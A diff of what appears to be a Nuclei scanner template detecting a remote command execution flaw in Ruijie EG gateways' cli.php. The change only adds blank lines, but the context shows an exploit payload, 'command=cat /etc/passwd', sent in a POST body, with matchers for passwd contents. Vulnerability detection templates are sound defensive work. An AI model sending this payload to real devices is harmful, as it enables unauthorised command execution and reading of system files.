@@ -1,4 +1,5 @@
 id: ruijie-eg-rce
+
 info:
   name: Ruijie EG cli.php RCE
   author: pikpikcu
@@ -6,6 +7,7 @@ info:
   reference: http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20cli.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
   vendor: https://www.ruijienetworks.com
   tags: ruijie,rce
+
 requests:
   - raw:
       - |
@@ -16,6 +18,7 @@ requests:
         Content-Length: 111
 
         notdelay=true&command=cat /etc/passwd
+
     matchers-condition: and
     matchers:
       - type: regex
@@ -23,6 +26,7 @@ requests:
           - "root:.*:0:0"
           - "nobody:x:0:0:"
         part: body
+
       - type: status
         status:
           - 200
